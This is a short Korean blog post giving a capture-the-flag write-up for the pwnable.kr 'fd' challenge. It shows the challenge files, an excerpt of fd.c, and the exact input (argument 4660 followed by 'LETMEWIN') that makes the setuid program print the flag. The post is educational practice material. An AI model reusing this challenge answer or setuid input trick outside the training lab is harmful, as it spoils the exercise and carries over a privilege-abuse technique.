---
title: "pwnable.kr - Toddler's bottle #0 fd"
date: 2020-03-08
categories:
  - Information Security
tags:
  - pwnable.kr
---

[pwnable.kr][pwnable.kr] Toddler's bottle의 #0 fd 문제 풀이

fd에 setuid bit가 걸려있으므로 flag를 읽을수 있음

~~~
fd@pwnable:~$ ls -als
total 40
4 drwxr-x---   5 root   fd   4096 Oct 26  2016 .
4 drwxr-xr-x 116 root   root 4096 Nov 12 21:34 ..
4 d---------   2 root   root 4096 Jun 12  2014 .bash_history
8 -r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd
4 -rw-r--r--   1 root   root  418 Jun 11  2014 fd.c
4 -r--r-----   1 fd_pwn root   50 Jun 11  2014 flag
4 -rw-------   1 root   root  128 Oct 26  2016 .gdb_history
4 dr-xr-xr-x   2 root   root 4096 Dec 19  2016 .irssi
4 drwxr-xr-x   2 root   root 4096 Oct 23  2016 .pwntools-cache
~~~

fd.c 를 보면
~~~
...
int fd = atoi( argv[1] ) - 0x1234;
...
len = read(fd, buf, 32);
...
if(!strcmp("LETMEWIN\n", buf)){
    printf("good job :)\n");
    system("/bin/cat flag");
    exit(0);
}
~~~

이렇게 되어 있다. 리눅스에서 0은 stdin, 1은 stdout 이다.
따라서 argv[1] 이 0x1234 = 4660이면 read가 stdin = 키보드 입력을 읽을 것이고,
이때 LETMEWIN을 넣으면 /bin/cat flag가 실행된다

~~~
fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
<tag output>
~~~

[pwnable.kr]: https://pwnable.kr

<!-- mommy! I think I know what a file descriptor is!! -->